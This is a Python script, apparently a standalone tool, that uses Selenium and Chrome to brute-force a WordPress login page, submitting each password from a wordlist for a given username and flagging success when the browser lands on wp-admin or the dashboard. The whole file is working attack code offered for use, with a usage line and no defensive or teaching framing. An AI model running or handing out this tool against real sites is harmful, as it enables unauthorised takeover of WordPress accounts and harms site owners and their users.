"""
Usage:
    python selenium-brute.py -h
    python selenium-brute.py -t http://localhost/wp-login.php -u admin -p password.txt
"""

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from optparse import OptionParser
import sys
import time

# Argument parser
parser = OptionParser()
parser.add_option("-t", dest="target", help="target's URL")
parser.add_option("-u", dest="user", help="username")
parser.add_option("-p", dest="pas", help="wordlist file (e.g., password.txt)")
(options, args) = parser.parse_args(sys.argv)

# Get CLI inputs
url = options.target
curuser = options.user
file = options.pas

# Read passwords from file
passwords = []
with open(file, "r") as s:
    passwords = [line.strip() for line in s if line.strip()]

# Start Chrome with Selenium 4
chrome_options = Options()
service = Service(r'chromedriver.exe')
driver = webdriver.Chrome(service=service, options=chrome_options)

# Brute force function for WordPress
def loginuserpass(passw):
    driver.get(url)
    time.sleep(1)

    print(f"Trying -> username: {curuser} | password: {passw}")

    try:
        # Fill in credentials
        driver.find_element(By.ID, "user_login").clear()
        driver.find_element(By.ID, "user_login").send_keys(curuser)

        driver.find_element(By.ID, "user_pass").clear()
        driver.find_element(By.ID, "user_pass").send_keys(passw)

        driver.find_element(By.ID, "wp-submit").click()
        time.sleep(2)

        current_url = driver.current_url
        print("Redirected to:", current_url)

        # ✅ WordPress Login Success Detection
        if "wp-admin" in current_url or "dashboard" in current_url:
            print("✅ Login successful!")
            print(f"🔑 Found password: {passw}")
            return True

        # Alternative: check for login failure message
        if "login_error" in driver.page_source:
            print("❌ Login failed.")

    except Exception as e:
        print("⚠️ Error:", e)

    print("-" * 40)
    return False

# Try all passwords
for pw in passwords:
    if loginuserpass(pw):
        break  # Stop if login was successful
